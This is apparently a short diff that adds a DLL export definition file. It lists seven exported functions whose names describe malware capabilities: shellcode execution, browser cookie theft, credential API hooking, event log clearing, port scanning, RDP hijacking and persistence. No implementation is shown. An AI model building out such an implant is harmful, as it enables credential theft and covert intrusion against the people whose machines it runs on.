@@ -1,0 +1,8 @@
+EXPORTS
+ExecuteShellCode
+StealBrowserCookies
+HookCredentialAPI
+ClearEventLogs
+PortScan
+RDPHijack
+InstallPersistence
